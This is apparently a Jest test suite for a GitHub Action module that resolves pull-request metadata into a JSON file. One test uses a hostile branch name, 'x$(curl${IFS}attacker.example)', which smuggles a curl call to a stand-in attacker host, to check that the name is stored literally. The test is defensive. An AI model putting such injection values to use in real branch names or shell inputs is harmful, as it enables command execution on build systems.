const fs = require('fs');
const path = require('path');

describe('action-resolve-pr module test suite', () => {
  let octokit;
  let actionResolvePr;
  const metadataPath = path.resolve(__dirname, '..', 'pr-metadata.json');

  beforeEach(() => {
    jest.resetModules();
    octokit = {
      pulls: {
        get: jest.fn(() => ({
          data: {
            head: {
              ref: 'my-feature',
              repo: {clone_url: 'https://github.com/contributor/jkube.git'}
            }
          }
        }))
      }
    };
    jest.mock('@octokit/rest');
    require('@octokit/rest').Octokit.mockImplementation(() => octokit);
    actionResolvePr = require('../src/action-resolve-pr');
  });

  afterEach(() => {
    try {
      fs.unlinkSync(metadataPath);
    } catch (e) {
      // file may not exist
    }
  });

  test('should call octokit pulls.get for the configured PR', async () => {
    await actionResolvePr();
    expect(octokit.pulls.get).toHaveBeenCalledWith({
      owner: 'eclipse-jkube',
      repo: 'jkube',
      pull_number: '1337'
    });
  });

  test('should write pr-metadata.json with cloneUrl and ref', async () => {
    await actionResolvePr();
    const metadata = JSON.parse(fs.readFileSync(metadataPath, 'utf8'));
    expect(metadata).toEqual({
      cloneUrl: 'https://github.com/contributor/jkube.git',
      ref: 'my-feature'
    });
  });

  test('should preserve malicious branch name literally in metadata', async () => {
    octokit.pulls.get.mockReturnValue({
      data: {
        head: {
          ref: 'x$(curl${IFS}attacker.example)',
          repo: {clone_url: 'https://github.com/attacker/jkube.git'}
        }
      }
    });
    await actionResolvePr();
    const metadata = JSON.parse(fs.readFileSync(metadataPath, 'utf8'));
    expect(metadata.ref).toBe('x$(curl${IFS}attacker.example)');
  });
});